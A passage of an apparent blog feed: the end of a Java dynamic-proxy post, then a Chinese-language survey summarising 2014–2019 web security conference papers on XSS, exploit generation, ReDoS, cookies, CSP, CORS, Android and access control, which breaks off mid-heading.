      &lt;h1 id=&quot;用法&quot;&gt;&lt;a href=&quot;#用法&quot; class=&quot;headerlink&quot; title=&quot;用法&quot;&gt;&lt;/a&gt;用法&lt;/h1&gt;&lt;p&gt;java动态代理机制可以实现使用一个抽象的中介类对任意类的任意方法进行进行代理，大致原理是运行时生成一个代理类，代理类再调用委托对象。&lt;/p&gt;&lt;h2 id=&quot;创建委托对象的接口&quot;&gt;&lt;a href=&quot;#创建委托对象的接口&quot; class=&quot;headerlink&quot; title=&quot;创建委托对象的接口&quot;&gt;&lt;/a&gt;创建委托对象的接口&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;interface&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Sell&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;sell&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Java" scheme="http://anemone.top/categories/Java/"/>
    
    
      <category term="java" scheme="http://anemone.top/tags/java/"/>
    
      <category term="反射" scheme="http://anemone.top/tags/%E5%8F%8D%E5%B0%84/"/>
    
      <category term="动态代理" scheme="http://anemone.top/tags/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>2014-2019Web安全研究方向调查报告</title>
    <link href="http://anemone.top/%E5%AD%A6%E6%9C%AF-%E5%AD%A6%E6%9C%AF%E5%9C%882014-2019Web%E5%AE%89%E5%85%A8%E6%96%B9%E5%90%91%E7%A0%94%E7%A9%B6%E6%83%85%E5%86%B5/"/>
    <id>http://anemone.top/学术-学术圈2014-2019Web安全方向研究情况/</id>
    <published>2019-02-27T02:16:20.000Z</published>
    <updated>2019-09-22T10:14:18.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="About"><a href="#About" class="headerlink" title="About"></a>About</h1><p>本文列出四大安全会议（USENIX、CCS、NDSS和S&amp;P）近5年来与Web安全有关的研究，已发现web方向的研究点。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>研究热点聚焦在DOM-XSS上：</p><h2 id="Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19"><a href="#Don’t-Trust-The-Locals-Investigating-the-Prevalence-of-Persistent-Client-Side-Cross-Site-Scripting-in-the-Wild-ndss19" class="headerlink" title="Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*"></a>Don’t Trust The Locals: Investigating the Prevalence of Persistent Client-Side Cross-Site Scripting in the Wild, ndss19*</h2><a id="more"></a><p>我们通过污点跟踪技术寻找客户端的XSS问题(感觉跟“Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting”的研究很像)</p><h2 id="Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18"><a href="#Riding-out-DOMsday-Towards-Detecting-and-Preventing-DOM-Cross-Site-Scripting-ndss18" class="headerlink" title="Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*"></a>Riding out DOMsday: Towards Detecting and Preventing DOM Cross-Site Scripting, ndss18*</h2><h3 id="什么是DOM型XSS："><a href="#什么是DOM型XSS：" class="headerlink" title="什么是DOM型XSS："></a>什么是DOM型XSS：</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1546778397220.png" alt="1546778397220"></p><h3 id="怎么防御："><a href="#怎么防御：" class="headerlink" title="怎么防御："></a>怎么防御：</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1546778565366.png" alt="1546778565366"></p><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>我们使用了向V8引擎注入污点技术，具体来说，我们在每个输入的字符串上增加了一个标记，最后看这些标记是否会被document.write()等函数(sink function)带出。在中间过程中我们需要考虑encodeURI等函数，他们应使标记失效。</p><ul><li><p>sink function：</p><ul><li>document.write()</li><li>document.writeln()</li><li>eval()</li><li>设置src属性的setAttribute</li><li>设置href属性的setAttribute</li><li>设置style属性的setAttribute</li><li>设置事件监听属性（onload/onerror/…）的setAttribute</li><li>在setTimeout和setInterval中的string2function</li><li>对document.cookie赋值</li><li>对document.location赋值</li></ul></li><li><p>使标记失效的函数</p><ul><li><p>escape</p><p>escape不编码字符有69个：*，+，-，.，/，@，_，0-9，a-z，A-Z</p></li><li><p>encodeURI</p><p>encodeURI不编码字符有82个：!，#，$，&amp;，’，(，)，*，+，,，-，.，/，:，;，=，?，@，_，~，0-9，a-z，A-Z</p></li><li><p>encodeURIComponent</p><p>encodeURIComponent不编码字符有71个：!， ‘，(，)，*，-，.，_，~，0-9，a-z，A-Z</p></li><li><p>encodeHTML</p><p>需要自己写，将字符串转换成html实体编码</p></li></ul></li></ul><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p>我们与其他静态工具做对比，发现BurpSuite只发现了10%的问题，但是发现了一些其他我们没有发现的问题，而其他工具存在相当高的误报率——95%</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><a href="https://github.com/wrmelicher/ChromiumTaintTracking" target="_blank" rel="noopener">https://github.com/wrmelicher/ChromiumTaintTracking</a></li><li>S. Lekies, B. Stock, and M. Johns, “25 million flows later: large-scale detection of DOM-based XSS,” in Proc. CCS, 2013, pp. 1193–1204.</li></ul><h2 id="Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14"><a href="#Precise-Client-side-Protection-against-DOM-based-Cross-Site-Scripting-usenix14" class="headerlink" title="Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14"></a>Precise Client-side Protection against DOM-based Cross-Site Scripting, usenix14</h2><p>目前对XSS的防御依赖于字符串检测，本文通过实验揭示了这种方法不能抵御所有的XSS攻击，为此，本文提出了一种基于污点跟踪和感知的XSS过滤器。</p><h2 id="Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14"><a href="#Static-Detection-of-Second-Order-Vulnerabilities-in-Web-Applications-usenix14" class="headerlink" title="Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14"></a>Static Detection of Second-Order Vulnerabilities in Web Applications, usenix14</h2><p>Second-Order漏洞是指攻击载荷首先存储在应用服务器上，接着在其他操作时触发的漏洞，本文第一个提出了检测该漏洞的静态代码分析方法，其通过检测连接数据库或对web应用内存的读取和写入操作检测该问题。</p><h1 id="EXP-Generation"><a href="#EXP-Generation" class="headerlink" title="EXP Generation"></a>EXP Generation</h1><h2 id="NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18"><a href="#NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications-usenix18" class="headerlink" title="NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*"></a>NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications, usenix18*</h2><p>本文构造了一个可拓展的动静结合的web漏洞生成框架，第一步，使用符号执行构建各个模块的行为模型，第二步，构建应用并且使用爬虫获取网站路径，同时使用动态符号执行最大化代码覆盖范围</p><h3 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h3><ul><li><a href="https://github.com/aalhuz/navex" target="_blank" rel="noopener">https://github.com/aalhuz/navex</a></li></ul><h2 id="Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16"><a href="#Chainsaw-Chained-Automated-Workflow-based-Exploit-Generation-ccs16" class="headerlink" title="Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*"></a>Chainsaw: Chained Automated Workflow-based Exploit Generation, ccs16*</h2><p>我们设计了一套EXP生成工具，以提高web注入漏洞的识别能力。为此该工具基于应用的数据流，数据库模型和本机函数等应对web应用程序的多模块，用户输入和多层架构的挑战。</p><h1 id="DoS"><a href="#DoS" class="headerlink" title="DoS"></a>DoS</h1><h2 id="Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18"><a href="#Rampart-protecting-web-applications-from-CPU-exhaustion-denial-of-service-attacks-defend-usenix18" class="headerlink" title="Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18"></a>Rampart: protecting web applications from CPU-exhaustion denial-of-service attacks(defend), usenix18</h2><p>高度复杂的DoS攻击只需要少量请求就可导致大量资源消耗，为此，我们设计工具Rampart，它通过统计方法和函数级别的程序分析方法，合成并部署过滤器来阻止DoS攻击。</p><h2 id="Tail-Attacks-on-Web-Applications-ccs17"><a href="#Tail-Attacks-on-Web-Applications-ccs17" class="headerlink" title="Tail Attacks on Web Applications, ccs17"></a>Tail Attacks on Web Applications, ccs17</h2><p>本文介绍了一种新型的DDoS攻击，这种攻击利用了网络应用的复杂性和依赖于分布式的特性，使网络响应大于1秒，我们构建了一个模型来检测这一攻击并且提出了一种防御方法。</p><h2 id="Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18"><a href="#Freezing-the-Web-A-Study-of-ReDoS-Vulnerabilities-in-JavaScript-based-Web-Servers-usenix18" class="headerlink" title="Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18"></a>Freezing the Web: A Study of ReDoS Vulnerabilities in JavaScript-based Web Servers, usenix18</h2><p>JavaScript的单线程执行模型使得基于JavaScript的web服务器特别容易受到ReDoS攻击。因此我们对2846个流行的网站进行分析，并且发现了25个之前未知的流行模块漏洞。</p><h2 id="The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18"><a href="#The-impact-of-regular-expression-denial-of-service-ReDoS-in-practice-an-empirical-study-at-the-ecosystem-scale-survey-fse18" class="headerlink" title="The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18"></a>The impact of regular expression denial of service (ReDoS) in practice: an empirical study at the ecosystem scale(survey), fse18</h2><p>正则表达式是导致拒绝服务的新原因，本文研究了ReDoS的三个方面：实际中超线性正则表达式（super-linear regex）的使用率，他们如何预防DoS攻击以及他们如何被修复。本文发现大量的JavaScript和Python依靠正则表达式，同时反模式（anti-patterns）有很少的漏报但是有很多误报，因此这些反模式是必要但不充分的。最后发现对待超线性的表达式，开发者愿意修改它而不是截断输入或是写新的。</p><h2 id="ReScue-crafting-regular-expression-DoS-attacks-ase18"><a href="#ReScue-crafting-regular-expression-DoS-attacks-ase18" class="headerlink" title="ReScue: crafting regular expression DoS attacks, ase18"></a>ReScue: crafting regular expression DoS attacks, ase18</h2><p>本文介绍了一种三阶段灰盒分析技术ReScure，它可以自动生成ReDoS字符串。它通过遗传算法选择种子，接着使用正则表达式算法选择具有最大搜索时间的字符串。</p><p>备注：南大计算机做的研究，好像也在搞移动测试</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18"><a href="#Who-left-open-the-cookie-jar-a-comprehensive-evaluation-of-third-party-cookie-policies-survey-usenix18" class="headerlink" title="Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18"></a>Who left open the cookie jar? a comprehensive evaluation of third-party cookie policies (survey), usenix18</h2><p>cookie容易受到XSS攻击，为此浏览器形成了各种保护机制和政策，本文能通过一个强制执行第三方请求的框架自动化评估这些防御机制的有效性，我们评估了7个浏览器的策略实现和46个浏览器插件，我们发现即使是内置的保护机制也可以被许多新技术绕过。</p><p>思考：Android Browser是不是也有这类问题？</p><h2 id="Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15"><a href="#Cookies-Lack-Integrity-Real-World-Implications-survey-usenix15" class="headerlink" title="Cookies Lack Integrity: Real-World Implications (survey), usenix15"></a>Cookies Lack Integrity: Real-World Implications (survey), usenix15</h2><p>设置了secure标志的cookie会被https加密传输，然而cookie的完整性仍然会受到攻击（没有应用HSTS），本文旨在了解攻击者如何进行一个cookie注入攻击。</p><h2 id="The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16"><a href="#The-Cracked-Cookie-Jar-HTTP-Cookie-Hijacking-and-the-Exposure-of-Private-Information-survey-S-amp-P16" class="headerlink" title="The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16"></a>The Cracked Cookie Jar: HTTP Cookie Hijacking and the Exposure of Private Information (survey), S&amp;P16</h2><p>由于不使用HTTPS，http存在中间人攻击的问题，本文总结了这些问题。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h2 id="CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17"><a href="#CCSP-Controlled-Relaxation-of-Content-Security-Policies-by-Runtime-Policy-Composition-defense-usenix17" class="headerlink" title="CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17"></a>CCSP: Controlled Relaxation of Content Security Policies by Runtime Policy Composition (defense), usenix17</h2><p>CSP(Content Security Policy)是W3C设计的用来防御内容注入的标准，但是其静态白名单的策略被先前的研究质疑，本文介绍了一种CSP的拓展CCSP，旨在克服静态白名单所来带来的限制同时避免大幅度修改原先的CSP。</p><h2 id="CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16"><a href="#CSPAutoGen-Black-box-Enforcement-of-Content-Security-Policy-upon-Real-world-Websites-defense-ccs16" class="headerlink" title="CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16"></a>CSPAutoGen: Black-box Enforcement of Content Security Policy upon Real-world Websites (defense), ccs16</h2><p>CSP是防御XSS攻击的好方式，但是据了解只有0.002%的网站使用了CSP，为此我们设计了工具CSPAutoGen，他为每个网站训练一个模板，再基于模板产生CSP规则。</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><h2 id="We-Still-Don’t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18"><a href="#We-Still-Don’t-Have-Secure-Cross-Domain-Requests-an-Empirical-Study-of-CORS-survey-usenix18" class="headerlink" title="We Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18"></a>We Still Don’t Have Secure Cross-Domain Requests: an Empirical Study of CORS (survey), usenix18</h2><p>开发者提出一些解决方法（比如JSONP）来绕过同源策略，这些方法同时引入了安全问题，CORS是一种更加规范的机制，但是本文通过实证研究发现，CORS的设计和部署受到许多新的安全问题影响：1）CORS放宽了跨域写权限2）开发人员不了解CORS导致错误配置。</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19"><a href="#Time-Does-Not-Heal-All-Wounds-A-Longitudinal-Analysis-of-Security-Mechanism-Support-in-Mobile-Browsers-suvery-ndss19" class="headerlink" title="Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19"></a>Time Does Not Heal All Wounds: A Longitudinal Analysis of Security-Mechanism Support in Mobile Browsers (suvery), ndss19</h2><p>本文发现web应用存在的问题仍然会在Android中出现，但是很多移动端浏览器并没有遵从安全准则（HTTP Header）。</p><p>被调查的HTTP Header：</p><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547798650411.png" alt="1547798650411"></p><h2 id="Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19"><a href="#Understanding-Open-Ports-in-Android-Applications-Discovery-Diagnosis-and-Security-Assessment-ndss19" class="headerlink" title="Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19"></a>Understanding Open Ports in Android Applications: Discovery, Diagnosis, and Security Assessment, ndss19</h2><p>本文通过众包方式了解到Android应用程序中开放端口的普及度为15.3%；本文还开发了一种新的静态诊断工具，显示61.8%的开放端口应用程序完全是由嵌入式sdk开发的，20.7%的应用程序使用了不安全的API。我们得出关于端口安全的三个结论：（1）脆弱性分析显示了以Instagram，SamsungGear，Skype，和FacebookSDK为首的5种脆弱的模式；（2）众包显示了224个蜂窝网络和2181个WiFi模式；（3）关于对端口进行DoS攻击的实验性演示</p><h2 id="FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18"><a href="#FlowCog-Context-aware-Semantics-Extraction-and-Analysis-of-Information-Flow-Leaks-in-Android-Apps-usenix18" class="headerlink" title="FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18"></a>FlowCog: Context-aware Semantics Extraction and Analysis of Information Flow Leaks in Android Apps, usenix18</h2><p>Android访问私人信息是否合法取决于应用是否向用户提供了足够的解释，FlowCog从Android视图中抽取相关的语义，再用NLP方法推断语义与给定流是否相关。</p><h3 id="相关资料-1"><a href="#相关资料-1" class="headerlink" title="相关资料"></a>相关资料</h3><ul><li>https: //github.com/SocietyMaster/FlowCog. </li></ul><h2 id="Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18"><a href="#Study-and-Mitigation-of-Origin-Stripping-Vulnerabilities-in-Hybrid-postMessage-Enabled-Mobile-Applications-S-amp-P18" class="headerlink" title="Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18"></a>Study and Mitigation of Origin Stripping Vulnerabilities in Hybrid-postMessage Enabled Mobile Applications, S&amp;P18</h2><p>web app通过post进行跨域请求，安卓的混合应用也会使用这些技术，它拓展了postMessage（我们称为“hybird postMessage”，同时也引入了新的问题——origin stripping vulnerability。本文中我们设计了一个工具来检测这问题。</p><h2 id="Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18"><a href="#Mobile-Application-Web-API-Reconnaissance-Web-to-Mobile-Inconsistencies-amp-Vulnerabilities-S-amp-P18" class="headerlink" title="Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**"></a>Mobile Application Web API Reconnaissance: Web-to-Mobile Inconsistencies &amp; Vulnerabilities, S&amp;P18**</h2><p>为了节约算力，很多webAPI的验证工作会在移动端进行，但是如果web端不重复验证的话，就会产生不一致的问题，攻击者可以篡改流量来攻击web应用。本文中，我们提出一个工具：WARDroid，它可以自动化的寻找web端和移动端的不一致问题。具体来说，WARDroid静态分析android app中的http通讯模板，接着通过黑盒测试的方法识别不一致性。</p><p><strong>Idea: </strong>可不可以做一个web的？因为web的前后端分离也会造成不一致问题(会议上有人提问)。</p><h3 id="Extract-Backward"><a href="#Extract-Backward" class="headerlink" title="Extract Backward"></a>Extract Backward</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547692426847.png" alt="1547692426847"></p><h3 id="HTTP-Request-Templates"><a href="#HTTP-Request-Templates" class="headerlink" title="HTTP Request Templates"></a>HTTP Request Templates</h3><p><img src="/学术-学术圈2014-2019Web安全方向研究情况/1547692490082.png" alt="1547692490082"></p><h2 id="Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17"><a href="#Measuring-the-Insecurity-of-Mobile-Deep-Links-of-Android-usenix17" class="headerlink" title="Measuring the Insecurity of Mobile Deep Links of Android, usenix17"></a>Measuring the Insecurity of Mobile Deep Links of Android, usenix17</h2><p>Deep Link是指应用内特殊的URI，它有助于网络到应用的通信，Android推出了两种新方法”App links”和“Intent URLs”用来替换scheme URL，但是没有多少时间，本文调查了2014-2016年google市场的APP，发现新的连接方式并没有带来安全性改善，只有2.2%的应用正确使用了新方法，另外，我们发现了一种新的风险，最后，我们发现了更多的URL劫持的案例。</p><h2 id="AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17"><a href="#AUTHSCOPE-Towards-Automatic-Discovery-of-Vulnerable-Authorizations-in-Online-Services-ccs17" class="headerlink" title="AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*"></a>AUTHSCOPE: Towards Automatic Discovery of Vulnerable Authorizations in Online Services, ccs17*</h2><p>本文设计AuthScope工具，该工具能够自动执行移动应用程序，并在相应的在线服务中识别出易受攻击的访问控制实现。</p><h2 id="Effective-Real-Time-Android-Application-Auditing-S-amp-P14"><a href="#Effective-Real-Time-Android-Application-Auditing-S-amp-P14" class="headerlink" title="Effective Real-Time Android Application Auditing, S&amp;P14"></a>Effective Real-Time Android Application Auditing, S&amp;P14</h2><p>本文设计了一套动态审计工具来检查应用是否存在<strong>数据泄露</strong>问题，降低静态检测的误报率。</p><h1 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript"></a>Javascript</h1><p>js存在的安全问题包含了XSS，因此这里排除了XSS。</p><h2 id="CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19"><a href="#CodeAlchemist-Semantics-Aware-Code-Generation-to-Find-Vulnerabilities-in-JavaScript-Engines-ndss19" class="headerlink" title="CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19"></a>CodeAlchemist: Semantics-Aware Code Generation to Find Vulnerabilities in JavaScript Engines, ndss19</h2><p>本文设计了一套js代码生成工具，它可以生成语义和语法上都正确的JavaScript片段，因此可以<strong>用于fuzz来发现JavaScript引擎的漏洞</strong>。具体来说，该工具将种子分解为代码片段，每一个片段用一段约束来标记，这些约束表示它与其他代码块在一起的条件。</p><h2 id="SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18"><a href="#SYNODE-Understanding-and-Automatically-Preventing-Injection-Attacks-on-NODE-JS-ndss18" class="headerlink" title="SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18"></a>SYNODE: Understanding and Automatically Preventing Injection Attacks on NODE.JS, ndss18</h2><p>本文发现Nodejs的很多模块存在命令注入攻击的问题，因此本文提出了Synode，一种结合静态分析和动态的方法，使开发者安全的使用这些有问题的库。具体来说，Synode静态分析哪些值会传播到API中，并且在安装时修复；动态运行时，它截恶意请求防止他们传递到api中。</p><h3 id="相关工作"><a href="#相关工作" class="headerlink" title="相关工作"></a>相关工作</h3><ul><li>X. Jin, X. Hu, K. Ying, W. Du, H. Yin, and G. N. Peri. Code injection attacks on HTML5-based mobile apps: Characterization, detection and mitigation. In Conference on Computer and Communications Security, pages 66–77, 2014</li><li>P. Saxena, D. Molnar, and B. Livshits. SCRIPTGARD: automatic context-sensitive sanitization for large-scale legacy web applications. In CCS, pages 601–614, 2011. </li><li>M. Ter Louw and V. N. Venkatakrishnan. Blueprint: Robust prevention of cross-site scripting attacks for existing browsers. In Sec. and Privacy, pages 331–346, 2009. </li><li>S. Guarnieri and B. Livshits. GATEKEEPER: mostly static enforcement of security and reliability policies for JavaScript code. In USENIX Security, pages 151–168, 2009. </li></ul><h2 id="Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17"><a href="#Thou-Shalt-Not-Depend-on-Me-Analysing-the-Use-of-Outdated-JavaScript-Libraries-on-the-Web-survey-ndss17" class="headerlink" title="Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17"></a>Thou Shalt Not Depend on Me: Analysing the Use of Outdated JavaScript Libraries on the Web (survey), ndss17</h2><p>本文对Alexa有排行的网站镜像进行了调查，发现web开发者会应用很多第三方库（比如jQuery），这些库的旧版本存在漏洞。</p><h2 id="The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15"><a href="#The-Unexpected-Dangers-of-Dynamic-JavaScript-survey-usenix15" class="headerlink" title="The Unexpected Dangers of Dynamic JavaScript (survey), usenix15"></a>The Unexpected Dangers of Dynamic JavaScript (survey), usenix15</h2><p>JS存在XSS等安全性问题，为此本文进行了实证研究了它的影响，并且提出了安全防护方法。</p><h2 id="ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15"><a href="#ZigZag-Automatically-Hardening-Web-Applications-Against-Client-side-Validation-Vulnerabilities-usenix15" class="headerlink" title="ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15"></a>ZigZag: Automatically Hardening Web Applications Against Client-side Validation Vulnerabilities, usenix15</h2><p>现代网站大量依赖JS，这些JS的客户端验证（client-side validation,CSV）存在脆弱性（实际上是逻辑问题），本文提出了一个检测该类问题的系统ZigZag，它是一个代理，透明的检测用户端代码，并且实时的获取执行状态，从中产生控制流和数据，以此识别与攻击相关的操作。</p><h2 id="Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14"><a href="#Hunting-the-Red-Fox-Online-Understanding-and-Detection-of-Mass-Redirect-Script-Injections-S-amp-P14" class="headerlink" title="Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14"></a>Hunting the Red Fox Online: Understanding and Detection of Mass Redirect-Script Injections, S&amp;P14</h2><p>本文开发了工具JsRED，一种用于自动检测<strong>重定向脚本注入</strong>的新技术，它通过比较当前的JS-lib版本和正常的版本差异判断脚本是否被替换。</p><h1 id="Access-control"><a href="#Access-control" class="headerlink" title="Access control"></a>Access control</h1><h2 id="FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15"><a href="#FlowWatcher-Defending-against-Data-Disclosure-Vulnerabilities-in-Web-Applications-css15" class="headerlink" title="FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15"></a>FlowWatcher: Defending against Data Disclosure Vulnerabilities in Web Applications, css15</h2><p>web应用会出现水平越权的问题，由于很多网站的用户访问控制模型类似，因此我们可以布置一个外部代理（nginx端），然后观察用户的所有流量，然后根据预期的访问控制策略规范来侦测未经授权的访问。</p><h2 id="MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14"><a href="#MACE-Detecting-Privilege-Escalation-Vulnerabilities-in-Web-Applications-css14" class="headerlink" title="MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14"></a>MACE: Detecting Privilege Escalation Vulnerabilities in Web Applications, css14</h2><p>我们实现了工具MACE，通过访问资源时的上下文不一致性来识别水平特权升级漏洞</p><h2 id="Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14"><a href="#Automating-Isolation-and-Least-Privilege-in-Web-Services-S-amp-P14" class="headerlink" title="Automating Isolation and Least Privilege in Web Services, S&amp;P14"></a>Automating Isolation and Least Privilege in Web Services, S&amp;P14</h2><p>本文设计了一个防止数据未授权读写的系统Passe，它动态地从开发者提供的测试用例分析数据流和控制流，将应用分离成几个模块，并且将模块放入沙盒中运行。另外，我们将Passe嵌入了Django框架中，我们发现它可以正确地分析96%的策略，同时还可以防御XSS攻击。</p><h1 id="Survey"><a href="#Survey" class="headerlink" title="Survey"></a>Survey</h1><p>能分类的survey已经分到具体的类型中，这里列出与web相关的其他调查。</p><h2 id="Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17"><a href="#Same-Origin-Policy-Evaluation-in-Modern-Browsers-usenix17" class="headerlink" title="Same-Origin Policy: Evaluation in Modern Browsers, usenix17"></a>Same-Origin Policy: Evaluation in Modern Browsers, usenix17</h2><p>SOP-DOM是同源策略的自己，它控制主文档和嵌入文档之间的交互，但是没有正式的规范，本文通过实证研究，发现除了Web Origins之外，SOP-DOM授予的访问权限至少取决于三个属性：嵌入元素（EE）的类型，沙箱（浏览器）和CORS属性。</p><h2 id="How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17"><a href="#How-the-Web-Tangled-Itself-Uncovering-the-History-of-Client-Side-Web-In-Security-usenix17" class="headerlink" title="How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, usenix17"></a>How the Web Tangled Itself: Uncovering the History of Client-Side Web (In)Security, 